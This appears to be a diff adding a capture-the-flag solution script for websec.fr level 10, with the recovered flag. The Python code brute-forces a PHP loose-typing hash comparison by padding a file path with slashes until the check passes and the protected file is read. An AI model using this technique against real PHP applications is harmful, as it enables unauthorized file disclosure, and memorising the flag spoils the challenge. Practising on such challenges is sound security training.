@@ -1,0 +1,16 @@
+import requests
+
+url = 'http://websec.fr/level10/index.php'
+payload = 'flag.php'
+i = 1
+
+while True: # i: 882
+	data = {'f': payload, 'hash': 0}
+	r = requests.post(url, data=data)
+	if "Permission denied!" not in r.text:
+		print(r.text)
+		break
+	payload = '.' + '/' * i + 'flag.php'
+	i += 1
+
+level10:WEBSEC{Lose_typ1ng_system_are_super_great_aren't_them?}
